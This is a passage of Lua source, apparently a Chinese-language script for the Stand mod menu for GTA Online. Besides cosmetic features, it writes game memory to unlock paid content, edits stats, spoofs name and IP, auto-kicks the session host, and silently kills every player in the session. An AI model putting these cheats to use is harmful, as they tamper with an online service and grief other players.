    menu.toggle_loop(trailsOpt,"轨迹", {"trails"}, "", function ()
        if not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(effect.asset) then
            STREAMING.REQUEST_NAMED_PTFX_ASSET(effect.asset)
            return
        end
        if timer.elapsed() >= 1000 then
            removeFxs(effects); effects = {}
            timer.reset()
        end
        if PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), true) then
            local vehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false)
            local minimum, maximum = v3.new(), v3.new()
            MISC.GET_MODEL_DIMENSIONS(ENTITY.GET_ENTITY_MODEL(vehicle), minimum, maximum)
            local offsets <const> = {v3(minimum.x, minimum.y, 0.0), v3(maximum.x, minimum.y, 0.0)}
            for _, offset in ipairs(offsets) do
                GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
                local fx =
                GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY(
                    effect.name,
                    vehicle,
                    offset.x,
                    offset.y,
                    0.0,
                    0.0,
                    0.0,
                    0.0,
                    0.7, --scale
                    false, false, false,
                    0, 0, 0, 0
                )
                GRAPHICS.SET_PARTICLE_FX_LOOPED_COLOUR(fx, colour.r, colour.g, colour.b, 0)
                table.insert(effects, fx)
            end
        elseif ENTITY.DOES_ENTITY_EXIST(players.user_ped()) then
            for _, boneId in ipairs(bones) do
                GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
                local fx =
                GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE(
                    effect.name,
                    players.user_ped(),
                    0.0,
                    0.0,
                    0.0,
                    0.0,
                    0.0,
                    0.0,
                    PED.GET_PED_BONE_INDEX(players.user_ped(), boneId),
                    0.7, --scale
                    false, false, false,
                    0, 0, 0, 0
                )
                GRAPHICS.SET_PARTICLE_FX_LOOPED_COLOUR(fx, colour.r, colour.g, colour.b, 0)
                table.insert(effects, fx)
            end
        end
    end, function ()
        removeFxs(effects); effects = {}
    end)
    
    local trailColour = menu.colour(trailsOpt,"颜色", {"trailcolour"}, "", colour, false, function(newColour)
         colour = newColour 
    end)
    menu.rainbow(trailColour)
    
    local ragdoll = menu.list(selflist, '摔倒选项', {'JSragdollOptions'}, '选择不同的摔倒选项.')

    menu.toggle_loop(ragdoll, '笨拙', {'JSclumsy'}, '让您的人物很容易摔倒.', function()
        clumsy()
    end)

    menu.action(ragdoll, '绊倒', {'JSstumble'}, '让你绊倒,很可能会摔倒.', function()
        stumble()
    end)

    local fallTimeout = false
    menu.toggle(ragdoll, '倒下', {'JSfallOver'}, '让您绊倒、跌倒并阻止您站起来.', function(toggle)
        if toggle then
            local vector = ENTITY.GET_ENTITY_FORWARD_VECTOR(players.user_ped())
            PED.SET_PED_TO_RAGDOLL_WITH_FALL(players.user_ped(), 1500, 2000, 2, vector.x, -vector.y, vector.z, 1, 0, 0, 0, 0, 0, 0)
        end
        fallTimeout = toggle
        while fallTimeout do
            PED.RESET_PED_RAGDOLL_TIMER(players.user_ped())
            util.yield_once()
        end
    end)

    menu.toggle_loop(ragdoll, '摔倒', {'JSragdoll'}, '让您的人物摔倒.', function()
        ragdoll_self()
    end)

local cus_respawn = menu.list(selflist, '自定义复活', {}, '')

custom_respawn_toggle = menu.toggle_loop(cus_respawn, '自定义复活' ..': '.. 'none', {}, '设置你死后重生的位置.', function()
    custom_respawn()
end)

custom_respawn_location = menu.action(cus_respawn, '保存位置', {}, '未设置位置.', function()
    save_custom_respawn()
end)

local unlocks = menu.list(selflist, "解锁", {}, "")

menu.action(unlocks, "解锁XMass内容", {}, "需要切换战局", function()
    memory.write_byte(memory.script_global(262145 + 33915), 1)  
    memory.write_byte(memory.script_global(262145 + 33916), 1)  
end)

menu.toggle_loop(unlocks, "50辆载具车库", {}, "", function()
    if memory.read_byte(memory.script_global(262145 + 32688)) ~= 0 then-- thx aero for this global <3
        memory.write_byte(memory.script_global(262145 + 32688), 0) 
    end

    if memory.read_byte(memory.script_global(262145 + 32702)) ~= 1 then
        memory.write_byte(memory.script_global(262145 + 32702), 1)  
    end
end)

menu.toggle_loop(unlocks, "解锁出租车任务", {}, "", function() -- credit to sapphire for all of this <3
    if memory.read_byte(memory.script_global(262145 + 33770)) ~= 1 then
        memory.write_byte(memory.script_global(262145 + 33770), 1)
    return end
end)

menu.action(unlocks, "毒品战争内容DLC内容", {}, "", function()
    for i = 33974, 34112, 1 do
        memory.write_byte(memory.script_global(262145 + i), 1)  
    end
end)

menu.action(unlocks, "圣诞和新年礼物", {}, "Change sessions for the gifts to be awarded.", function()
    memory.write_byte(memory.script_global(262145 + 33915), 1)  
    memory.write_byte(memory.script_global(262145 + 33916), 1)  
end)


local collectibles = menu.list(unlocks, "收藏品", {}, "")

menu.click_slider(collectibles, "电影道具", {""}, "", 0, 9, 0, 1, function(i)
    util.trigger_script_event(1 << players.user(), {0xB9BA4D30, 0, 0x0, i, 1, 1, 1})
end)

menu.click_slider(collectibles, "隐藏包裹", {""}, "", 0, 9, 0, 1, function(i)
    util.trigger_script_event(1 << players.user(), {0xB9BA4D30, 0, 0x1, i, 1, 1, 1})
end)

menu.click_slider(collectibles, "藏宝箱", {""}, "", 0, 1, 0, 1, function(i)
    util.trigger_script_event(1 << players.user(), {0xB9BA4D30, 0, 0x2, i, 1, 1, 1})
end)

menu.click_slider(collectibles, "信号干扰器", {""}, "", 0, 9, 0, 1, function(i)
    util.trigger_script_event(1 << players.user(), {0xB9BA4D30, 0, 0x3, i, 1, 1, 1})
end)

menu.click_slider(collectibles, "媒体音乐棒", {""}, "", 0, 19, 0, 1, function(i)
    util.trigger_script_event(1 << players.user(), {0xB9BA4D30, 0, 0x4, i, 1, 1, 1})
end)

menu.action(collectibles, "沉船", {""}, "", function()
    util.trigger_script_event(1 << players.user(), {0xB9BA4D30, 0, 0x5, 0, 1, 1, 1})
end)

menu.click_slider(collectibles, "隐藏包裹", {""}, "", 0, 1, 0, 1, function(i)
    util.trigger_script_event(1 << players.user(), {0xB9BA4D30, 0, 0x6, i, 1, 1, 1})
end)

menu.action(collectibles, "万圣节T恤", {""}, "", function()
    util.trigger_script_event(1 << players.user(), {0xB9BA4D30, 0, 0x7, 1, 1, 1, 1})
end)

menu.click_slider(collectibles, "给糖或捣乱", {""}, "", 0, 9, 0, 1, function(i)
    util.trigger_script_event(1 << players.user(), {0xB9BA4D30, 0, 0x8, i, 1, 1, 1})
end)

menu.click_slider(collectibles, "拉玛有机坊产品", {""}, "", 0, 99, 0, 1, function(i)
    util.trigger_script_event(1 << players.user(), {0xB9BA4D30, 0, 0x9, i, 1, 1, 1})
end)

menu.click_slider(collectibles, "拉机能量高空跳伞", {""}, "", 0, 9, 0, 1, function(i)
    util.trigger_script_event(1 << players.user(), {0xB9BA4D30, 0, 0xA, i, 1, 1, 1})
end)

menu.toggle_loop(helperingame, "自动接受并加入游戏", {}, "将自动接受游戏邀请", function()
    autoaccept()
end)

menu.toggle_loop(helperingame, "自动获取脚本主机", {"scriptshost"}, "更快获取脚本主机", function()

    if players.get_script_host() ~= players.user() and get_transition_state(players.user()) ~= 0 then

        menu.trigger_command(menu.ref_by_path("Players>"..players.get_name_with_tags(players.user())..">Friendly>Give Script Host"))

    end

end)

menu.toggle_loop(helperingame, "自动获取主机", {"alwayshost"}, "", function()

	if not (players.get_host() == PLAYER.PLAYER_ID()) and not util.is_session_transition_active() then

		if not (PLAYER.GET_PLAYER_NAME(players.get_host()) == "**Invalid**") then

			menu.trigger_commands("kick"..PLAYER.GET_PLAYER_NAME(players.get_host()))

			util.yield(200)

		end

	end

end)

menu.toggle(helperingame, "提高FPS V1", {"fpsboost"}, "", function(on_toggle)
	if on_toggle then
		notification("正在设置FPS...")
		menu.trigger_commands("weather" .. " extrasunny")
		menu.trigger_commands("clouds" .. " clear01")
		menu.trigger_commands("time" .. " 6")
		menu.trigger_commands("superc")
        menu.trigger_commands("noidlecam ")
	else
		notification("正在重置FPS...")
		menu.trigger_commands("weather" .. " normal")
		menu.trigger_commands("clouds" .. " normal")
        menu.trigger_commands("noidlecam ")
		end
	end)

	menu.toggle(helperingame, "提高FPS V2", {"fpsnsboost"}, ".", function(on_toggle)
	if on_toggle then
		notification("正在设置FPS...")
		menu.trigger_commands("weather" .. " extrasunny")
		menu.trigger_commands("clouds" .. " clear01")
		menu.trigger_commands("time" .. " 6")
		menu.trigger_commands("superc")
        menu.trigger_commands("potatomode ")
        menu.trigger_commands("nosky ")
        menu.trigger_commands("noidlecam ")
	else
		notification("正在重置FPS...")
		menu.trigger_commands("weather" .. " normal")
		menu.trigger_commands("clouds" .. " normal")
        menu.trigger_commands("potatomode ")
        menu.trigger_commands("nosky ")
        menu.trigger_commands("noidlecam ")
		end
	end)

menu.toggle_loop(helperingame, "PVP防御模式", {}, "", function()
    pvpdefmode()
end)

menu.toggle_loop(helperingame, "武装玩家", {"ghostarmedplayers"}, "对手持武器的玩家启用幽灵模式.", function()
    for _, pid in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        if WEAPON.IS_PED_ARMED(ped, 7) or TASK.GET_IS_TASK_ACTIVE(ped, 199) or TASK.GET_IS_TASK_ACTIVE(ped, 128) 
        or IsPlayerUsingGuidedMissile(pid) or IsPlayerInRcTank(pid) or IsPlayerInRcBandito(pid) or IsPlayerFlyingAnyDrone(pid) then
            NETWORK.SET_REMOTE_PLAYER_AS_GHOST(pid, true)
        else
            NETWORK.SET_REMOTE_PLAYER_AS_GHOST(pid, false)
        end
    end
end, function()
    for _, pid in ipairs(players.list(false, true, true)) do
        NETWORK.SET_REMOTE_PLAYER_AS_GHOST(pid, false)
    end
end)

menu.toggle(helperingame, "天基炮", {""}, "虚假的天基炮，无实际作用", function(state)
		orbital_cannon_map_is_charging = false
		orbital_cannon_map_is_shooting = false
		orbital_cannon_map_time = 0
		orbital_cannon_map_zoom = 0
		orbital_cannon_map_pos_x = text_func(ENTITY.GET_ENTITY_COORDS(players.user()).x)
		orbital_cannon_map_pos_y = text_func(ENTITY.GET_ENTITY_COORDS(players.user()).y)
		orbital_cannon_map_scaleform = GRAPHICS.REQUEST_SCALEFORM_MOVIE("ORBITAL_CANNON_MAP")  
        local old_pos = ENTITY.GET_ENTITY_COORDS(players.user_ped(), false)
        orb = state    
    	while orb do
			util.yield()
			ENTITY.SET_ENTITY_COORDS_NO_OFFSET(players.user_ped(players.user()), ENTITY.GET_ENTITY_COORDS(players.user()).x,ENTITY.GET_ENTITY_COORDS(players.user()).y,ENTITY.GET_ENTITY_COORDS(players.user()).z)
			ENTITY.FREEZE_ENTITY_POSITION(players.user_ped(players.user()), true)
			TASK.CLEAR_PED_TASKS_IMMEDIATELY(players.user_ped(players.user()))
			if PAD.IS_DISABLED_CONTROL_PRESSED(2, 77) then
				if orbital_cannon_map_pos_y >= -10000 and orbital_cannon_map_pos_y <= 10000 then
					orbital_cannon_map_pos_y = orbital_cannon_map_pos_y + 2
				else
					orbital_cannon_map_pos_y = 0
				end
			end
			if PAD.IS_DISABLED_CONTROL_PRESSED(2, 133) then
				if orbital_cannon_map_pos_x >= -10000 and orbital_cannon_map_pos_x <= 10000 then
					orbital_cannon_map_pos_x = orbital_cannon_map_pos_x - 2
				else
					orbital_cannon_map_pos_x = 0
				end
			end
			if PAD.IS_DISABLED_CONTROL_PRESSED(2, 134) then
				if orbital_cannon_map_pos_x >= -10000 and orbital_cannon_map_pos_x <= 10000 then
					orbital_cannon_map_pos_x = orbital_cannon_map_pos_x + 2
				else
					orbital_cannon_map_pos_x = 0
				end
			end
			if PAD.IS_DISABLED_CONTROL_PRESSED(2, 139) then
				if orbital_cannon_map_pos_y >= -10000 and orbital_cannon_map_pos_y <= 10000 then
					orbital_cannon_map_pos_y = orbital_cannon_map_pos_y - 2
				else
					orbital_cannon_map_pos_y = 0
				end
			end
			if PAD.IS_DISABLED_CONTROL_PRESSED(2, 15) then
				if orbital_cannon_map_zoom >= 0 and orbital_cannon_map_zoom <= 2 then
					orbital_cannon_map_zoom = orbital_cannon_map_zoom + 0.05
				else
					orbital_cannon_map_zoom = 0
				end
			end
			if PAD.IS_DISABLED_CONTROL_PRESSED(2, 14) then
				if orbital_cannon_map_zoom >= 0 and orbital_cannon_map_zoom <= 2 then
					orbital_cannon_map_zoom = orbital_cannon_map_zoom - 0.05
				else
					orbital_cannon_map_zoom = 0
				end
			end
        	GRAPHICS.DRAW_SCALEFORM_MOVIE_FULLSCREEN(orbital_cannon_map_scaleform, 255, 255, 255, 255, 0)
			GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(orbital_cannon_map_scaleform, "MOVE_TO")
			GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_INT(orbital_cannon_map_pos_x)
			GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_INT(orbital_cannon_map_pos_y)
        	GRAPHICS.END_SCALEFORM_MOVIE_METHOD(orbital_cannon_map_scaleform)
			GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(orbital_cannon_map_scaleform, "ZOOM_TO")
			GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_FLOAT(orbital_cannon_map_zoom)
			GRAPHICS.END_SCALEFORM_MOVIE_METHOD(orbital_cannon_map_scaleform)
			if PAD.IS_DISABLED_CONTROL_PRESSED(2, 24) then
				orbital_cannon_map_is_charging = true
			else
				orbital_cannon_map_is_charging = false
				orbital_cannon_map_time = 0
			end
			if orbital_cannon_map_is_charging then
				if not orbital_cannon_map_is_shooting then
					GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(orbital_cannon_map_scaleform, "START_COUNTDOWN")
					GRAPHICS.END_SCALEFORM_MOVIE_METHOD(orbital_cannon_map_scaleform)
				end
				orbital_cannon_map_is_shooting = true
				orbital_cannon_map_time = orbital_cannon_map_time + 1
			else
				if orbital_cannon_map_is_shooting then
					GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(orbital_cannon_map_scaleform, "CANCEL_ANIMATION")
					GRAPHICS.END_SCALEFORM_MOVIE_METHOD(orbital_cannon_map_scaleform)
				end
				orbital_cannon_map_is_shooting = false
				orbital_cannon_map_time = 0
			end
			if orbital_cannon_map_time >= 499 then
				local success, float = get_ground_z(v3(orbital_cannon_map_pos_x, orbital_cannon_map_pos_y, ENTITY.GET_ENTITY_COORDS(players.user()).z + 25))
				local pos_real = get_v3_of_v2(v2(orbital_cannon_map_pos_x, orbital_cannon_map_pos_y))
				if success then
					pos_real = v3(orbital_cannon_map_pos_x, orbital_cannon_map_pos_y, float + 1)
				else
					pos_real = get_v3_of_v2(v2(orbital_cannon_map_pos_x, orbital_cannon_map_pos_y))
				end
				GRAPHICS.USE_PARTICLE_FX_ASSET("scr_xm_orbital")
				while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED("scr_xm_orbital") do
					STREAMING.REQUEST_NAMED_PTFX_ASSET("scr_xm_orbital")
					util.yield()
				end
				AUDIO.PLAY_SOUND_FROM_COORD(1, "DLC_XM_Explosions_Orbital_Cannon", pos_real, 0, true, 0, false)
				FIRE.ADD_EXPLOSION(pos_real.x,pos_real.y,pos_real.z, 59, true, false, 1, players.user_ped())
				GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD("scr_xm_orbital_blast", pos_real.x,pos_real.y,pos_real.z, v3(0, 180, 0), 1, true, true, true)
				orbital_cannon_map_time = 0
			end
   		end
            orbital_cannon_map_is_charging = false
            orbital_cannon_map_is_shooting = false
            orbital_cannon_map_time = 0
            orbital_cannon_map_zoom = 0
            orbital_cannon_map_pos_x = 0
            orbital_cannon_map_pos_y = 0
            ENTITY.FREEZE_ENTITY_POSITION(players.user_ped(), false)
            set_scaleform_movie_as_no_longer_needed(orbital_cannon_map_scaleform)
            pcall(ENTITY.SET_ENTITY_COORDS, players.user_ped(), old_pos.x,old_pos.y,old_pos.z, false, false)
    end)

    menu.toggle(helperingame, "人间蒸发", {"renwuxiaoshi"}, "开启人间蒸发",
    function(state)
        menu.trigger_command(menu.ref_by_path("Self>Appearance>Invisibility>" .. (state and "Enabled" or "Disabled"), 38))
        menu.set_value(menu.ref_by_path("Online>Off The Radar", 38), state)
        announce("幽灵模式 " .. (state and "On" or "Off"))
    end
    )
    togglestate = false

menu.toggle_loop(helperingame, "假死雷达（地图上不显示你）", {"undeadotr"}, "", function()
    undead()
end, function ()
	ENTITY.SET_ENTITY_MAX_HEALTH(players.user_ped(), maxHealth_cantseeyouinmap)
end)

php_bars = false
menu.toggle(helperingame, "NPC血条", {"pedhpbars"}, "在NPC上面画血量条。", function(on)
php_bars = on
mod_uses("ped", if on then 1 else -1)
if vhp_bars and on then
    notification("警告:您同时打开了车辆HP指示条。由于引擎限制,某些HP条形图可能无法渲染", colors.blue)
end
end)

vhp_bars = false
menu.toggle(helperingame, translate("Self", "载具血条"), {}, "", function(on)
    vhp_bars = on
    mod_uses("vehicle", if on then 1 else -1)
    if php_bars and on then
        notification(vehicle_hp_bars_warn)
    end
end)

menu.toggle_loop(helperingame, "刑事毁坏", {""}, "", function(on)
    if SCRIPT.GET_NUMBER_OF_THREADS_RUNNING_THE_SCRIPT_WITH_THIS_HASH(util.joaat("am_criminal_damage")) ~= 0 then
        if memory.read_int(memory.script_local("am_criminal_damage", 2040 + 1+players.user()*7 + 2)) == 3 then
            hash = util.joaat('titan')
            local c = {}
            c.x = 4497.2207
            c.y = 8028.3086
            c.z = -32.635174
            request_model_load(hash) 
            local v = entities.create_vehicle(hash, c, math.random(0, 270))
            if v ~= 0 then
                PED.SET_PED_INTO_VEHICLE(players.user_ped(), v, -1)
                while not ENTITY.IS_ENTITY_IN_WATER(v) or not PED.IS_PED_IN_VEHICLE(players.user_ped(), v, false) do
                    util.yield()
                end
                util.yield(5)
                entities.delete_by_handle(v)
            end
        end
    end
end)

menu.toggle_loop(helperingame, "检查点收集", {""}, "", function(cp_speedrun_on)
    if SCRIPT.GET_NUMBER_OF_THREADS_RUNNING_THE_SCRIPT_WITH_THIS_HASH(util.joaat("am_cp_collection")) ~= 0 then
        local cp_blip = HUD.GET_NEXT_BLIP_INFO_ID(431)
        if cp_blip ~= 0 then
            local c = HUD.GET_BLIP_COORDS(cp_blip)
            ENTITY.SET_ENTITY_COORDS(players.user_ped(), c.x, c.y, c.z, false, false, false, false)
        end
    end
end)

util.on_transition_finished(function()
    if random_name_spoof then
        menu.trigger_commands("spoofedname " .. random_string(16))
    end
    if random_ip_spoof then
        menu.trigger_commands("spoofedip " .. random_ip_address())
    end
    if random_rank_spoof then
        menu.trigger_commands("spoofedrank " .. math.random(10000))
    end
end)

	    menu.toggle_loop(helperingame, "强制可见", {"forcevisible"}, "", function()
	        for _, pid in players.list(false) do
	            local ped = PLAYER.GET_PLAYER_PED(pid)
	            if not ENTITY.IS_ENTITY_VISIBLE(ped) then
	                ENTITY.SET_ENTITY_VISIBLE(ped, true)
	            end
	        end
	    end)

local maxps = menu.list(helperingame, "战局管控", {}, "")

menu.slider(maxps, "设置战局玩家上限", {}, "只有你是战局主机时才生效", 1, 32, 32, 1, function (value)
    if Stand_internal_script_can_run then
        NETWORK.NETWORK_SESSION_SET_MATCHMAKING_GROUP_MAX(0, value)
        util.toast("free slots",NETWORK.NETWORK_SESSION_GET_MATCHMAKING_GROUP_FREE(0))
    end
end)
menu.slider(maxps, "设置战局观众上限", {}, "只有你是战局主机时才生效", 0, 2, 2, 1, function (value)
    if Stand_internal_script_can_run then
        NETWORK.NETWORK_SESSION_SET_MATCHMAKING_GROUP_MAX(4, value)
        util.toast("free slots",NETWORK.NETWORK_SESSION_GET_MATCHMAKING_GROUP_FREE(4))
    end
end)

menu.toggle_loop(helperingame, "快速重生", {"fastrespawn"}, "", function()
    local ped_ptr = entities.handle_to_pointer(players.user_ped())
    local gwobaw = memory.script_global(2672505 + 1684 + 756) -- Global_2672505.f_1684.f_756
    if entities.get_health(ped_ptr) < 100 then
        GRAPHICS.ANIMPOSTFX_STOP_ALL()
        memory.write_int(gwobaw, memory.read_int(gwobaw) | 1 << 1)
    end
end,
    function()
    local gwobaw = memory.script_global(2672505 + 1684 + 756)
    memory.write_int(gwobaw, memory.read_int(gwobaw) &~ (1 << 1)) 
end)


function handle_player_list(pid) -- thanks to dangerman and aaron for showing me how to delete players properly
    local ref = menus[pid]
    if not players.exists(pid) then
        if ref then
            menu.delete(ref)
            menus[pid] = nil
        end
    end
end
roll_speed = nil
menu.list_select(helperingame, "翻滚速度", {}, "", {"正常", "1.25x", "1.5x", "1.75x", "2x"}, 1, function(index, value)
roll_speed = index
util.create_tick_handler(function()
    switch value do
        case "1.25x":
            STATS.STAT_SET_INT(util.joaat("MP"..util.get_char_slot().."_SHOOTING_ABILITY"), 115, true)
            break
        case "1.5x":
            STATS.STAT_SET_INT(util.joaat("MP"..util.get_char_slot().."_SHOOTING_ABILITY"), 125, true)
            break
        case "1.75x":
            STATS.STAT_SET_INT(util.joaat("MP"..util.get_char_slot().."_SHOOTING_ABILITY"), 135, true)
            break
        case "2x":
            STATS.STAT_SET_INT(util.joaat("MP"..util.get_char_slot().."_SHOOTING_ABILITY"), 150, true)
            break
        end
        return roll_speed == index
    end)
end)

infibounty_amt = 10000
menu.slider(helperingame, "赏金金额", {}, "", 0, 10000, 10000, 1, function(s)
    infibounty_amt = s
  end)

menu.toggle_loop(helperingame, "赏金开启", {}, "", function(click_type)
    util.yield(60000)
end)

menu.action(helperingame, "虐待动物", {}, "爆炸所有附近的动物", function()
    animalFound = false
    for i, aPed in pairs(entities.get_all_peds_as_handles()) do 
       if PED.IS_PED_HUMAN(aPed) ~= true then 
        animalFound = true
        local pedPos = ENTITY.GET_ENTITY_COORDS(aPed)
        FIRE.ADD_EXPLOSION(pedPos.x, pedPos.y, pedPos.z, 0, 1, true, false, 0, false)
       end
    end
    if animalFound == false then 
        util.toast("动物被发现了")
    end
end)

menu.toggle_loop(helperingame, "在下车时关闭无敌模式", {""}, "", function()
    if not ENTITY.GET_ENTITY_CAN_BE_DAMAGED(entities.get_user_vehicle_as_handle()) then
        if not PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), false) then
            ENTITY.SET_ENTITY_CAN_BE_DAMAGED(PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), true), true)
        end
    end
end)

menu.toggle_loop(helperingame, "快速更换武器", {"fasthands"}, "武器更换速度更快.", function()
    if TASK.GET_IS_TASK_ACTIVE(players.user_ped(), 56) then
        PED.FORCE_PED_AI_AND_ANIMATION_UPDATE(players.user_ped())
    end
end)

menu.toggle_loop(helperingame, "快速热启动", {""}, "", function()
    if not VEHICLE.GET_IS_VEHICLE_ENGINE_RUNNING(entities.get_user_vehicle_as_handle()) and TASK.GET_IS_TASK_ACTIVE(players.user_ped(), 150) then
        PED.FORCE_PED_AI_AND_ANIMATION_UPDATE(players.user_ped())
    end
end)

menu.toggle_loop(helperingame, "达克斯冷却", {}, "跳过达克斯工作的冷却时间", function() -- thx icedoomfist for the state name <3
    STATS.STAT_SET_INT(util.joaat("MP"..util.get_char_slot().."_XM22JUGGALOWORKCDTIMER"), -1, true)
end)

local modifier = 1.00
menu.slider_float(helperingame, "近战伤害修改", {"meleedamage"}, "", 100, 1000, 100, 10, function(value)
    modifier = value / 100
    PLAYER.SET_PLAYER_MELEE_WEAPON_DAMAGE_MODIFIER(players.user(), modifier)
end)
	
local language_codes_by_enum = {
    [0]= "en-us",
    [1]= "fr-fr",
    [2]= "de-de",
    [3]= "it-it",
    [4]= "es-es",
    [5]= "pt-br",
    [6]= "pl-pl",
    [7]= "ru-ru",
    [8]= "ko-kr",
    [9]= "zh-tw",
    [10] = "ja-jp",
    [11] = "es-mx",
    [12] = "zh-cn"
}

menu.action(helperingame, "杀死全部NPC", {}, "", function()
    local counter = 0
    for _, ped in ipairs(entities.get_all_peds_as_handles()) do
        if HUD.GET_BLIP_COLOUR(HUD.GET_BLIP_FROM_ENTITY(ped)) == 1 or TASK.GET_IS_TASK_ACTIVE(ped, 352) then -- shitty way to go about it but hey, it works (most of the time).
            ENTITY.SET_ENTITY_HEALTH(ped, 0)
            counter += 1
            util.yield()
        end
    end
    if counter == 0 then
        util.toast("没有发现NPC. :/")
    else
        util.toast("杀死 ".. tostring(counter) .." NPC.")
    end
end)

menu.action(helperingame, "无声杀害", {"killeveryone"}, "无声地杀死所有人", function()
    for k,v in pairs(players.list(false, true, true)) do
        kill_player(v)
        util.yield()
    end
end)

menu.action(helperingame, translate("Self", "爆炸自己"), {"explodemyself"}, "", function()
	local pos = ENTITY.GET_ENTITY_COORDS(players.user_ped(), false)
	pos.z = pos.z - 1.0
	FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), pos.x, pos.y, pos.z, 0, 1.0, true, false, 1.0)
end)

menu.toggle(helperingame,"屏幕渲染", {}, "", function(on)
    xcpm(on)
end)

local roll_speed = nil
menu.list_select(helperingame, "战斗翻滚速度", {}, "", {"默认", "1.25x", "1.5x", "1.75x", "2x"}, 1, function(index, value)
roll_speed = index
util.create_tick_handler(function()
    switch value do
        case "1.25x":
            STATS.STAT_SET_INT(util.joaat("MP"..util.get_char_slot().."_SHOOTING_ABILITY"), 115, true)
            break
        case "1.5x":
            STATS.STAT_SET_INT(util.joaat("MP"..util.get_char_slot().."_SHOOTING_ABILITY"), 125, true)
            break
        case "1.75x":
            STATS.STAT_SET_INT(util.joaat("MP"..util.get_char_slot().."_SHOOTING_ABILITY"), 135, true)
            break
        case "2x":
            STATS.STAT_SET_INT(util.joaat("MP"..util.get_char_slot().."_SHOOTING_ABILITY"), 150, true)
            break
        end
        return roll_speed == index
    end)
end)

menu.action(helperingame, "传送安全代码", {}, "传送机构任务中的安全密码 (tequi-la-la, stripclub)", function()
    local objTable = entities.get_all_objects_as_pointers()
    local lookingFor = 367638847 -- || 0x15E9B93F || sf_prop_sf_codes_01a || HEXtoDECIMAL
    for i = 1, #objTable do
        if entities.get_model_hash(objTable[i]) == lookingFor then
            local h = entities.pointer_to_handle(objTable[i])
            local ppos = getEntityCoords(GetLocalPed())
            ENTITY.SET_ENTITY_COORDS(h, ppos.x, ppos.y, ppos.z, false, false, false, false)
            break
        end
    end
end)

menu.toggle_loop(helperingame, "透视无人机 (试验)", {}, "", function ()
    local objs = entities.get_all_objects_as_pointers()
    for _, obj in pairs(objs) do
        if (entities.get_model_hash(obj) == 430841677) or (entities.get_model_hash(obj) == -1324942671) then --nano drone object
            local pos = entities.get_position(obj)
            local ourpedpos = getEntityCoords(GetLocalPed())
            GRAPHICS.DRAW_LINE(ourpedpos.x, ourpedpos.y, ourpedpos.z, pos.x, pos.y, pos.z, 255, 255, 255, 255)
        end
    end
end)

editGuns = menu.list(helperingame, "工具枪", {}, "")

attachGun = menu.list(editGuns, "附加枪 (非物理)", {}, "附加枪的设置, 将实体附加到实体.")
attach_gun = {
    e1 = 0, e2 = 0,
    bone = 0,
    px = 0, py = 0, pz = 0,
    rx = 0, ry = 0, rz = 0,
    softPinning = false, collision = false,
    vertexIndex = 0, fixedRot = true
}
menu.divider(attachGun, "------")
menu.toggle_loop(attachGun, "开启", {"attachgun"}, "以非物理方式将实体附加到实体 (没有PED).", function ()
    if attach_gun.e1 == 0 then util.draw_debug_text("移动1") elseif attach_gun.e2 == 0 then util.draw_debug_text("移动2") end
    if PLAYER.IS_PLAYER_FREE_AIMING(players.user()) then
        if PAD.IS_CONTROL_JUST_PRESSED(0, 54) then -- 54 || INPUT_WEAPON_SPECIAL_TWO || E
            local entpointer = memory.alloc()
            util.toast("分配.")
            if PLAYER.GET_ENTITY_PLAYER_IS_FREE_AIMING_AT(players.user(), entpointer) then
                local handle = memory.read_int(entpointer)
                if ENTITY.IS_ENTITY_A_PED(handle) then handle = PED.GET_VEHICLE_PED_IS_IN(handle, false) end
                if attach_gun.e1 == 0 then
                    attach_gun.e1 = handle
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(handle)
                elseif attach_gun.e2 == 0 then
                    if attach_gun.e1 == handle then util.toast("不能有相同的实体!") else
                        attach_gun.e2 = handle
                        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(handle)
                        ---- --- -- ---
                        util.toast("附加完成!")
                        --attachments here
                        local en1 = attach_gun.e1
                        local en2 = attach_gun.e2
                        --(entity1, entity2, boneIndex, xPos, yPos, zPos, xRot, yRot, zRot, p9, useSoftPinning, collision, isPed, vertexIndex, fixedRot)
                        ENTITY.ATTACH_ENTITY_TO_ENTITY(en1, en2, attach_gun.bone, attach_gun.px, attach_gun.py, attach_gun.pz, attach_gun.rx, attach_gun.ry, attach_gun.rz, false,
                        attach_gun.softPinning, attach_gun.collision, false, attach_gun.vertexIndex, attach_gun.fixedRot)
                        --clear edit gun memory
                        attach_gun.e1 = 0
                        attach_gun.e2 = 0
                    end
                end
            end
            util.toast("释放.")
            memory.free(entpointer)
        end
    end
end)

menu.divider(attachGun, "设置")
menu.slider(attachGun, "骨骼位置", {"attachGunbone"}, "附枪骨骼位置.仅限高级用户!", -100000, 100000, 0, 1, function(value) attach_gun.bone = value end)
menu.slider(attachGun, "X 偏移", {"attachGunxoffset"}, "", -10000, 10000, 0, 100, function (value) attach_gun.px = value/100 end);menu.slider(attachGun, "Y 偏移", {"attachGunyoffset"}, "", -10000, 10000, 0, 100, function (value) attach_gun.py = value/100 end);menu.slider(attachGun, "Z 偏移", {"attachGunzoffset"}, "", -10000, 10000, 0, 100, function (value) attach_gun.pz = value/100 end)
